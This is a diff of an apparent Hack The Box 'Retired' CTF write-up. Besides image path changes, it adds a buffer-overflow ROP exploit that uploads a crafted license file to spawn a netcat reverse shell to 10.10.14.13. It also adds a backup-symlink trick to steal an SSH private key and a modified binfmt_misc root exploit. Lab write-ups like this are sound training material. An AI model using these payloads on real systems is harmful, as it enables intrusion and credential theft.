@@ -23,9 +23,9 @@ PORT   STATE SERVICE
 
 When we visit port 80, there's an obvious LFI present:
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (6).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (4).png" alt=""><figcaption></figcaption></figure>
 
 I was a bit lazy, so I created a quick Python script to read the files:
 
@@ -66,7 +66,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 `beta.html` contained a file upload that did nothing, but it revealed some information regarding an `activate_license` application present:
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (7).png" alt=""><figcaption></figcaption></figure>
 
 We can fuzz to find this binary somewhere. Create a quck file with PATH variables:
 
@@ -200,7 +200,7 @@ $ curl http://10.129.227.96/index.php?page=../../../../../../../proc/432/maps
 <TRUNCATED>
 ```
 
-### Ghidra + Mprotect + Offset
+### Ghidra + Offset
 
 First we can see that PIE is enabled on this binary:
 
@@ -215,15 +215,15 @@ RELRO     : FULL
 
 NX is also enabled, so we probably need to do a Ret2Libc exploit after leaking the `libc` address. Within the `activate_license` function, there's a BOF vulnerability due to the hardcoded buffer length and lack of length validation. Furthermore, the first 4 characters read from input are the buffer length used:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 So we can probably overwrite this with a huge number of bytes. I ran the binary on my own machine on port 5555, and it seems to take some input.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (5).png" alt=""><figcaption></figcaption></figure>
 
 From reading `ghidra`, it appears that it does some SQL stuff with our input after getting it:
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (6).png" alt=""><figcaption></figcaption></figure>
 
 So from this, it seems that the binary uses both `libc` and `libsqlite3` within this function. We can download both of them from the machine itself.&#x20;
 
@@ -340,5 +340,216 @@ pop_rdx = p64(libc_base + 0x000cb1cd) # pop rdx; ret;
 mov = p64(libc_base + 0x0003ace5) # mov qword ptr [rdi], rdx; ret;
 ```
 
-Then once we have these, we can use this to find the offset and write a `system` command to the binary.
+Then once we have these, we can use this to find the offset and write a `system` command to the binary. The script used in the guide uses a basic `bash` shell and inserts it in:
 
+```python
+cmd = b"bash -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 7777 >/tmp/f' \x00"
+```
+
+Then, the ROP chaining occurs, where the command is written into the memory space 8 bytes at a time:
+
+```python
+for i in range(0,len(cmd),8):
+		rop += pop_rdi
+		rop += p64(writable + i)
+		rop += pop_rdx
+		rop += cmd[i:i+8].ljust(8, b"\x00")
+		rop += mov
+```
+
+Afterwards, the whole ROP chain is written into a file and sent to the remote web server. This is done because the web server accepts file uploads and sends the file contents directly to the `activate_license` binary, which would trigger the shell.
+
+```python
+rop += pop_rdi
+	rop += p64(writable)
+	rop += system
+	with open('getshell.key','wb') as f:
+		f.write(rop)
+	files = {"licensefile": ("getshell.key", open("getshell.key","rb"),
+	'application/x-iwork-keynote-sffkey')}
+	requests.post(f"http://10.129.227.96/activate_license.php", files=files)
+```
+
+If this script is run, it gives us a reverse shell that we can upgrade.
+
+<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation
+
+### Backup Symlink Exploit
+
+The first few things we notice is that there's a few backup zip files in the directory we are in:
+
+```
+www-data@retired:/var/www$ ls -la
+total 1512
+drwxrwsrwx  3 www-data www-data   4096 May 11 04:59 .
+drwxr-xr-x 12 root     root       4096 Mar 11  2022 ..
+-rw-r--r--  1 dev      www-data 505153 May 11 04:57 2023-05-11_04-57-01-html.zip
+-rw-r--r--  1 dev      www-data 505153 May 11 04:58 2023-05-11_04-58-09-html.zip
+-rw-r--r--  1 dev      www-data 505153 May 11 04:59 2023-05-11_04-59-01-html.zip
+drwxrwsrwx  5 www-data www-data   4096 Mar 11  2022 html
+-rw-r--r--  1 www-data www-data  12288 May 11 04:55 license.sqlite
+```
+
+If we list the timers, we can see that there's a website\_backup script being run somewhere:
+
+```
+www-data@retired:/var/www$ systemctl list-timers
+NEXT         LEFT         LAST          PASSED       UNIT          ACTIVATES
+Thu 2023-05… 35s left     Thu 2023-05-… 23s ago      website_back… website_back…
+```
+
+I ran a `grep` to view files that had `html.zip` within them and found one:
+
+```
+www-data@retired:/var/www$ grep -r / -e 'html.zip' 2> /dev/null
+/usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
+```
+
+Here's teh script contents:
+
+```bash
+#!/bin/bash
+set -euf -o pipefail
+
+cd /var/www/
+
+SRC=/var/www/html
+DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
+
+/usr/bin/rm --force -- "$DST"
+/usr/bin/zip --recurse-paths "$DST" "$SRC"
+
+KEEP=10
+/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
+    | sort --zero-terminated --numeric-sort --reverse \
+    | while IFS= read -r -d '' backup; do
+        if [ "$KEEP" -le 0 ]; then
+            /usr/bin/rm --force -- "$backup"
+        fi
+        KEEP="$((KEEP-1))"
+    done
+```
+
+This thing backs up the entire `/var/www/html` directory and zips it. This is exploitable because we can create a symlink to the entire `/home/dev` directory within the backup file.
+
+```
+www-data@retired:/var/www/html$ ln -s /home/dev/ file
+```
+
+Then we wait for the script to run again, and unzip the latest file:
+
+```
+www-data@retired:/var/www$ unzip 2023-05-11_05-07-01-html.zip
+<TRUNCATED>
+inflating: var/www/html/file/.ssh/id_rsa.pub  
+inflating: var/www/html/file/.ssh/authorized_keys  
+inflating: var/www/html/file/.ssh/id_rsa
+<TRUNCATED>
+```
+
+We can see that it works, and now we can grab the user's private key and `ssh` in. We can then grab the user flag.
+
+### Emuemu
+
+Within the user's directory, there's an `emuemu` folder:
+
+```
+dev@retired:~$ ls
+activate_license  emuemu  user.txt
+
+dev@retired:~/emuemu$ ls -la
+total 68
+drwx------ 3 dev dev  4096 Mar 11  2022 .
+drwx------ 6 dev dev  4096 Mar 11  2022 ..
+-rw------- 1 dev dev   673 Oct 13  2021 Makefile
+-rw------- 1 dev dev   228 Oct 13  2021 README.md
+-rw------- 1 dev dev 16608 Oct 13  2021 emuemu
+-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c
+-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper
+-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c
+drwx------ 2 dev dev  4096 Mar 11  2022 test
+```
+
+The contents of `reg_helper.c` is rather interesting:
+
+```c
+int main(void) {
+    char cmd[512] = { 0 };
+
+    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
+
+    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
+    if (-1 == fd)
+        perror("open");
+    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
+        perror("write");
+    if (close(fd) == -1)
+        perror("close");
+
+    return 0;
+}
+```
+
+This file is executable by us, and it seems to use `binfmt_misc` or something. The `Makefile` would create the binary and within it, it runs `setcap`:
+
+```bash
+dev@retired:~/emuemu$ cat Makefile 
+CC := gcc
+CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion
+
+SOURCES := $(wildcard *.c)
+TARGETS := $(SOURCES:.c=)
+
+.PHONY: install clean
+
+install: $(TARGETS)
+        @echo "[+] Installing program files"
+        install --mode 0755 emuemu /usr/bin/
+        mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
+        install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
+        setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
+
+        @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
+        echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
+                | tee /usr/lib/binfmt.d/emuemu.conf \
+                | /usr/lib/emuemu/reg_helper
+
+clean:
+        rm -f -- $(TARGETS)
+```
+
+So this bianry has `cap_dac_override` capability. There are some exploits for `binfmt_misc` that would spawn a `root` shell if we can write to the `/proc/sys/fs/binfmt_misc/register` file, of which this binary can.
+
+{% embed url="https://github.com/toffan/binfmt_misc" %}
+
+We have to edit the exploit a bit. First we can remove all the checks on the writeability of the above file:
+
+```bash
+#function not_writeable()
+#{
+#	test ! -w "$mountpoint/register"
+#}
+
+# not_writeable && die "Error: $mountpoint/register is not writeable"
+```
+
+Then, since `reg_helper` is the binary that is allowed to write to that file, we have to change the last few lines of the exploit to use that binary instead:
+
+```bash
+binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
+echo "$binfmt_line" | /usr/lib/emuemu/reg_helper
+
+exec "$target"
+```
+
+The `/usr/lib/emuemu/reg_helper` binary is used because it is owned by `root`. The one within our home directory is owned by us, so it won't work in bypassing restrictions. After downloading it and running it, we would get a `root` shell.
+
+<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+
+This machine was hard for me, and I used a writeup for initial access and `emuemu` exploitation.&#x20;
+
+{% embed url="https://0xdf.gitlab.io/2022/08/13/htb-retired.html#abuse-binfmt_misc" %}
+
+{% embed url="https://pencer.io/ctf/ctf-htb-retired/#ssh-as-dev" %}
